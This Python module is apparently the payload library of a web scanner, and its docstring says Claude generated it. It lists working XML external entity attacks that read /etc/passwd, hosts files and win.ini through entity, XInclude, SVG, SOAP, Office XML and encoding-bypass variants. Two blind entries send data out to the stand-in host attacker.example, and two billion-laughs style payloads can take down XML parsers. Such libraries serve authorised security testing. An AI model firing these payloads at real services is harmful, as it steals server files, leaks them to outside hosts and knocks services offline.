"""xxe payload library — generated dev-time by Claude.

Each entry has an XML body + a marker regex that fires only when an XXE
actually fetched the file. The scanner tries multiple Content-Types so
parsers that only honor a specific MIME still get probed.

Categories:
  classic        — Plain entity reference (works on libxml2 / Xerces / etc.)
  parameter-ent  — Parameter-entity (XXE inside DOCTYPE itself)
  xinclude       — <xi:include parse="text" href=...>
  svg            — SVG image upload XXE (DocBook-style)
  soap           — SOAP envelope XXE (common in legacy SOAP APIs)
  docx           — Office XML XXE (.docx/.xlsx unzip and re-XML)
  utf16          — UTF-16-encoded payloads (bypasses naive regex/WAF)
  json-xml       — Content-Type forced from XML on JSON endpoint
  blind-oob      — OOB exfil via parameter-entity (no inline reflection)
  dos            — Billion-laughs / quadratic-blowup denial-of-service
"""

XXE_PAYLOADS = [
  # ── Classic /etc/passwd exfil ──
  {
    "name": "Classic /etc/passwd",
    "category": "classic",
    "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    "matcher": r"root:x:0:0:",
    "severity": "CRITICAL", "cvss": 9.1,
  },
  {
    "name": "Classic /etc/hosts",
    "category": "classic",
    "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
    "matcher": r"127\.0\.0\.1\s+localhost|::1\s+localhost",
    "severity": "CRITICAL", "cvss": 9.1,
  },
  {
    "name": "Windows win.ini",
    "category": "classic",
    "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    "matcher": r"\[fonts\]|\[extensions\]|\[mci extensions\]",
    "severity": "CRITICAL", "cvss": 9.1,
  },
  {
    "name": "Windows hosts",
    "category": "classic",
    "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><foo>&xxe;</foo>',
    "matcher": r"127\.0\.0\.1\s+localhost|Microsoft Corp",
    "severity": "CRITICAL", "cvss": 9.1,
  },
  {
    "name": "PHP base64 wrapper",
    "category": "classic",
    "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
    "matcher": r"cm9vdDp4OjA6MDo",
    "severity": "CRITICAL", "cvss": 9.1,
  },

  # ── Parameter-entity (XXE inside DOCTYPE) ──
  {
    "name": "Parameter-entity passwd",
    "category": "parameter-ent",
    "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><foo>test</foo>',
    "matcher": r"root:x:0:0:",
    "severity": "CRITICAL", "cvss": 9.1,
  },
  {
    "name": "Parameter-entity nested",
    "category": "parameter-ent",
    "body": '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'data:,%file;\'>"> %eval; %exfil;]><root/>',
    "matcher": r"root:x:0:0:",
    "severity": "CRITICAL", "cvss": 9.1,
  },

  # ── XInclude ──
  {
    "name": "XInclude text",
    "category": "xinclude",
    "body": '<?xml version="1.0"?><foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
    "matcher": r"root:x:0:0:",
    "severity": "CRITICAL", "cvss": 9.1,
  },
  {
    "name": "XInclude xml fallback",
    "category": "xinclude",
    "body": '<?xml version="1.0"?><foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"><xi:fallback><xi:include parse="text" href="file:///etc/passwd"/></xi:fallback></xi:include></foo>',
    "matcher": r"root:x:0:0:",
    "severity": "CRITICAL", "cvss": 9.1,
  },

  # ── SVG upload XXE ──
  {
    "name": "SVG XXE passwd",
    "category": "svg",
    "body": '<?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>',
    "matcher": r"root:x:0:0:",
    "severity": "CRITICAL", "cvss": 9.1,
  },

  # ── SOAP envelope ──
  {
    "name": "SOAP envelope XXE",
    "category": "soap",
    "body": '<?xml version="1.0"?><!DOCTYPE soap [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>',
    "matcher": r"root:x:0:0:",
    "severity": "CRITICAL", "cvss": 9.1,
  },

  # ── DOCX/XLSX inner ──
  {
    "name": "Office XML inner",
    "category": "docx",
    "body": '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE w:document [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body></w:document>',
    "matcher": r"root:x:0:0:",
    "severity": "CRITICAL", "cvss": 9.1,
  },

  # ── UTF-16 encoding bypass (parsers that pre-WAF on UTF-8 only) ──
  {
    "name": "UTF-16BE bypass",
    "category": "utf16",
    "body": '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    "matcher": r"root:x:0:0:",
    "severity": "CRITICAL", "cvss": 9.1,
  },
  {
    "name": "ISO-8859-1 bypass",
    "category": "utf16",
    "body": '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    "matcher": r"root:x:0:0:",
    "severity": "CRITICAL", "cvss": 9.1,
  },

  # ── JSON endpoint accepting XML when Content-Type forced ──
  {
    "name": "JSON→XML coercion",
    "category": "json-xml",
    "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    "matcher": r"root:x:0:0:",
    "severity": "CRITICAL", "cvss": 9.1,
  },

  # ── Blind / OOB ──
  {
    "name": "Blind OOB DNS",
    "category": "blind-oob",
    "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://%RAND%.oob.attacker.example/"> %xxe;]><foo>test</foo>',
    "matcher": r"OOB",
    "severity": "HIGH", "cvss": 7.5,
  },
  {
    "name": "Blind OOB FTP exfil",
    "category": "blind-oob",
    "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://%RAND%.oob.attacker.example/exfil.dtd"> %dtd;]><foo>test</foo>',
    "matcher": r"OOB",
    "severity": "CRITICAL", "cvss": 9.1,
  },

  # ── DoS variants (response signature: hang or 500) ──
  {
    "name": "Billion laughs",
    "category": "dos",
    "body": '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>',
    "matcher": r"DOS_TIMEOUT|lol{50,}",
    "severity": "MEDIUM", "cvss": 5.3,
  },
  {
    "name": "Quadratic blowup",
    "category": "dos",
    "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY a "' + ("a" * 5000) + '">]><foo>' + ("&a;" * 50) + '</foo>',
    "matcher": r"DOS_TIMEOUT|a{50000,}",
    "severity": "MEDIUM", "cvss": 5.3,
  },
]
